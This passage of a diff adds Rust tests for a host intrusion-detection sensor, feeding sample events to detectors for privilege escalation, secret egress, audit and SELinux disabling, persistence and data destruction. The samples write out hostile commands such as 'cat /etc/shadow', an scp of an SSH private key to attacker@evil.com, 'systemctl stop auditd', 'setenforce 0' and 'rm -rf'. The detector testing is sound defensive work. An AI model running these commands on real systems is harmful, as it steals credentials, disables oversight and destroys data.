+                        "pid": 4242,
+                        "uid": 1000
+                    }),
+                ),
+            ),
+            (
+                Box::new(|detectors| {
+                    detectors.setuid_exploit_pattern = Some(
+                        detectors::setuid_exploit_pattern::SetuidExploitPatternDetector::new(
+                            "sensor-test-host",
+                        ),
+                    );
+                }),
+                sample_event(
+                    "shell.command_exec",
+                    Severity::Info,
+                    serde_json::json!({
+                        "pid": 4242,
+                        "uid": 1000,
+                        "euid": 0,
+                        "ppid": 4241,
+                        "suid": true,
+                        "comm": "customprivesc",
+                        "parent_comm": "bash",
+                        "command": "/tmp/customprivesc",
+                        "argv": ["/tmp/customprivesc"],
+                        "argc": 1
+                    }),
+                ),
+            ),
+            (
+                Box::new(|detectors| {
+                    detectors.capabilities_abuse = Some(
+                        detectors::capabilities_abuse::CapabilitiesAbuseDetector::new(
+                            "sensor-test-host",
+                        ),
+                    );
+                }),
+                sample_event(
+                    "shell.command_exec",
+                    Severity::Info,
+                    serde_json::json!({
+                        "pid": 4242,
+                        "uid": 1000,
+                        "ppid": 4241,
+                        "capabilities": ["CAP_DAC_READ_SEARCH"],
+                        "comm": "cat",
+                        "parent_comm": "bash",
+                        "command": "cat /etc/shadow",
+                        "argv": ["/usr/bin/cat"],
+                        "argc": 1
+                    }),
+                ),
+            ),
+            (
+                Box::new(|detectors| {
+                    detectors.lateral_egress_ssh = Some(
+                        detectors::lateral_egress_ssh::LateralEgressSshDetector::new(
+                            "sensor-test-host",
+                        ),
+                    );
+                }),
+                sample_shell_exec(&["ssh", "attacker@8.8.8.8"], "nginx", 33),
+            ),
+            (
+                Box::new(|detectors| {
+                    detectors.lateral_egress_scp_rsync = Some(
+                        detectors::lateral_egress_scp_rsync::LateralEgressScpRsyncDetector::new(
+                            "sensor-test-host",
+                        ),
+                    );
+                }),
+                sample_shell_exec(
+                    &[
+                        "scp",
+                        "/home/ubuntu/.ssh/id_rsa",
+                        "attacker@evil.com:/tmp/loot",
+                    ],
+                    "bash",
+                    1000,
+                ),
+            ),
+            (
+                Box::new(|detectors| {
+                    detectors.pam_module_change =
+                        Some(detectors::pam_module_change::PamModuleChangeDetector::new(
+                            "sensor-test-host",
+                        ));
+                }),
+                sample_file_write("/etc/pam.d/sshd", "bash", "bash", 1000),
+            ),
+            (
+                Box::new(|detectors| {
+                    detectors.auditd_disable = Some(
+                        detectors::auditd_disable::AuditdDisableDetector::new("sensor-test-host"),
+                    );
+                }),
+                sample_shell_exec(&["systemctl", "stop", "auditd"], "bash", 0),
+            ),
+            (
+                Box::new(|detectors| {
+                    detectors.selinux_apparmor_disable = Some(
+                        detectors::selinux_apparmor_disable::SelinuxApparmorDisableDetector::new(
+                            "sensor-test-host",
+                        ),
+                    );
+                }),
+                sample_shell_exec(&["setenforce", "0"], "bash", 0),
+            ),
+            (
+                Box::new(|detectors| {
+                    detectors.startup_script_persistence = Some(
+                        detectors::startup_script_persistence::StartupScriptPersistenceDetector::new(
+                            "sensor-test-host",
+                        ),
+                    );
+                }),
+                sample_file_write("/etc/rc.local", "vim", "bash", 0),
+            ),
+            (
+                Box::new(|detectors| {
+                    detectors.data_destruction_pattern = Some(
+                        detectors::data_destruction_pattern::DataDestructionPatternDetector::new(
+                            "sensor-test-host",
+                        ),
+                    );
+                }),
+                sample_shell_exec(&["rm", "-rf", "/home/ubuntu/work"], "bash", 1000),
+            ),
+            (
+                Box::new(|detectors| {
+                    detectors.symlink_hijack = Some(
+                        detectors::symlink_hijack::SymlinkHijackDetector::new("sensor-test-host"),
+                    );
+                }),
+                sample_shell_exec(&["ln", "-s", "/etc/shadow", "/tmp/innocent"], "bash", 1000),
+            ),
+            (
+                Box::new(|detectors| {
+                    detectors.system_user_interactive = Some(
+                        detectors::system_user_interactive::SystemUserInteractiveDetector::new(
+                            "sensor-test-host",
+                        ),
+                    );
+                }),
+                sample_event(
+                    "shell.command_exec",
+                    Severity::Info,
+                    serde_json::json!({
+                        "argv": ["bash", "-i"],
+                        "argc": 2,
+                        "command": "bash -i",
+                        "pid": 4242,
+                        "uid": 33,
+                        "username": "www-data",
+                        "comm": "bash",
+                        "parent_comm": "sshd",
+                        "tty": "pts/0"
+                    }),
+                ),
+            ),
+        ];
+
+        let incident_count: u64 = cases
+            .into_iter()
+            .map(|(configure, event)| run_case(configure, event))
+            .sum();
+
+        assert!(
+            incident_count >= 7,
+            "representative detector cases should emit incidents; got {incident_count}"
+        );
+    }
+
+    #[cfg(target_os = "linux")]
+    #[test]
+    fn bpf_instruction_helpers_encode_filter_fields() {
+        let stmt = bpf_stmt(0x20, 0x00050001).to_ne_bytes();
+        assert_eq!(u16::from_ne_bytes([stmt[0], stmt[1]]), 0x20);
+        assert_eq!(stmt[2], 0);
+        assert_eq!(stmt[3], 0);
+        assert_eq!(
+            u32::from_ne_bytes([stmt[4], stmt[5], stmt[6], stmt[7]]),
+            0x00050001
+        );
+
+        let jump = bpf_jump(0x15, 63, 2, 1).to_ne_bytes();
+        assert_eq!(u16::from_ne_bytes([jump[0], jump[1]]), 0x15);
+        assert_eq!(jump[2], 2);
+        assert_eq!(jump[3], 1);
+        assert_eq!(u32::from_ne_bytes([jump[4], jump[5], jump[6], jump[7]]), 63);
+    }
+
+    #[cfg(target_os = "linux")]
+    #[test]
+    fn syscall_name_to_nr_maps_known_syscalls_and_rejects_unknown() {
+        assert_eq!(syscall_name_to_nr("read"), Some(63));
+        assert_eq!(syscall_name_to_nr("write"), Some(64));
+        assert_eq!(syscall_name_to_nr("epoll_wait"), Some(22));
+        assert_eq!(syscall_name_to_nr("definitely_not_a_syscall"), None);
     }
 
     // ── Wave 9f anchors (2026-05-04) — journald-detection contract ───────
